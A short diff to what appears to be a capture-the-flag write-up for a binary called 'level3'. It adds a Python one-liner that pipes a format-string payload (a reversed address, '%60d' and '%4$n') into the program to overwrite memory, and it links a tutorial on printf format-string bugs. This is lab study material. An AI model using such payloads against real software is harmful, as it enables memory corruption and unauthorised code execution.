@@ -105,6 +105,8 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 "A" * 60 <===> "%60c"
 
+`(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d" + "%4$n"' ; cat) | ./level3`
+
 ressource
 
 [1](https://medium.com/@gurdeeps158/exploit-format-string-vulnerability-in-printf-6740d9ff057e)
